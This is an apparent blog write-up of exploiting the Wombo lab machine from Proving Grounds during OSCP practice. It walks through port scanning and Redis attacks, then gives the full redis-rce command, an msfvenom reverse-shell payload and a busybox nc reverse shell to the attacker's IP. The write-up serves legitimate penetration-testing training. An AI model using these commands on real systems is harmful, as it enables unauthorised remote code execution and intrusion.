---
layout: writeup
title: Wombo - Proving Grounds
date: 2024-07-24 13:32:20 +0300
description: A Writeup of the Wombo Box from Proving Grounds
image: # /assets/images/Flu/Flu_1.png
fig-caption: # Add figcaption (optional)
tags: [Linux, LainKusunagi, Redis]
---

Here's box on the [LainKusanagi list of OSCP like machines](https://www.reddit.com/r/oscp/comments/1c8pzyz/lainkusanagi_list_of_oscp_like_machines/) we have Wombo from Proving Grounds. This box is rated as Easy, and the community rates it as Intermediate. Let's see how complicated I can make it for myself. And I'll kick things off with an nmap scan revealing: 

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
6379/tcp  open  redis
8080/tcp  open  http-proxy
27017/tcp open  mongod
```

I begin by visiting ports 80 and 8080 while running directory scans in the background. Port 80 looks to be the default landing page for nginx, so we may have to wait for directory scans on that one. 

![Wombo1.png](/assets/images/Wombo/Wombo1.png){: .responsive-image}


Port 8080 looks to be a web app called NodeBB. I click around on that for a while, but it doesn't look like there's much content here. I can create a user, and there is an upload page for a cover photo, but it does seem like it's restricted by file type. If we try uploading a php file for example, the option to crop comes before the final upload button which won't work if it's a php, so we can't make changes in Burp easily. I may have to come back to that. 

![Wombo2.png](/assets/images/Wombo/Wombo2.png){: .responsive-image}


We also have a redis instance on port 6379. It does not require authentication, but enumerating it briefly doesn't reveal anything interesting. I'll have to try a few of the exploits from hacktricks on here like dumping the db, RCE with redis-rogue-server, PHP webshell, and template webshell. Unfortunately dumping the db reveals nothing, redis-rogue-server doesn't work, we can't upload a PHP webshell because the db is read only, and uploading a template doesn't work. 

I am a little tempted by MongoDB on port 27017, if only because the lab is called Wombo. It's just close enough. I am able to access it using mongo `192.168.185.69:27017`, but it requires authentication to show users, collections, or dbs. 

I spent a while trying to find anything to work with here. Port 80 shows nothing at all on directory scans. Port 8080 does return some directories from the NodeBB application, but there don't appear to be any juicy exploits with it, and we have no usernames or passwords to at least kick off a reasonable brute force with it. I can get no information from mongodb, it's not even clear that there actually are any non-empty db's. 

Turns out I had to combine exploits again as with [Sybaris](https://cagrigsby.github.io/writeups/2024-07-14-readys-proving-grounds/). There is an exploit called [Redis-RCE](https://github.com/Ridter/redis-rce), but the README.md links another exploit to get a required redis module from, and this link is broken. It turns out we can use the `exp.so` module from [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server0)that we used in Sybaris and simply move it to the redis-rce folder. It's pretty annoying because I had tried to load it my kali, but this doesn't work because with Sybaris we uploaded it to an ftp server and were able to load it locally. The final command is:
`./redis-rce.py -r 192.168.185.69 -p 6379 -L 192.168.45.183 -P 6379 -f exp.so`

![Wombo3.png](/assets/images/Wombo/Wombo3.png){: .responsive-image}

This shell had some weird behavior, for example no initial response to the `id` command, and it appeared that some commands were being returned only after a subsequent command was ran. As such, I decided to download another reverse shell and run it from this interactive shell. I used `msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.183 LPORT=27017 -f elf -o reverse27017.elf` and downloaded it, catching it from a penelope listener. 

![Wombo4.png](/assets/images/Wombo/Wombo4.png){: .responsive-image}

Some other command line shells didn't work, but the busybox one actually did (`busybox nc 192.168.45.183 27017 -e /bin/bash`). I'd initially tried it over port 4444, and that wasn't going to work. 

Lessons learned: This was a pretty unsatisfying box for me. I had to combine exploits in a way that wasn't really intuitive, and I'm not sure how I would have done that without looking it up. The module we loaded could have just been packaged with the exploit rather than having a separate module associated with a broken link. So I guess the lesson is that if I need to exploit redis with a public exploit, I either need an an AMD machine or I need to remember to keep pulling the same malicious module from [redis-rogue-server](https://github.com/n0b0dyCN/redis-rogue-server0). Which is indeed a lesson. 

